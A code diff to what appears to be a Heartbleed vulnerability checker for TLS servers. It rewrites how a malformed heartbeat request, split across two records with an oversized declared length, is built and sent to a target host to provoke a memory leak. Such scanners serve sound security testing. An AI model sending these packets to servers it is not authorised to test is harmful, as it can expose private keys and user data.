@@ -132,20 +132,19 @@ def is_vulnerable(host, timeout):
         return None
     s.send(hello)
 
-    hbpkt = h2bin("01 4e 20") + "\x01"*20000
-    hb = h2bin("18 03 03 40 00") + hbpkt[0:16384] + \
-            h2bin("18 03 03 0e 23") + hbpkt[16384:]
-
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
             return None
 
-        # copy ssl version from server to heartbeat request packet
-        hb=hb[:2] + chr(ver&0xff) + hb[3:]
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
+
+    # construct heartbeat request packet
+    ver_chr = chr(ver&0xff)
+    hb  = h2bin("18 03") + ver_chr + h2bin("40 00 01 3f fd") + "\x01"*16381
+    hb += h2bin("18 03") + ver_chr + h2bin("00 03 01 00 00")
 
     s.send(hb)
     return hit_hb(s)
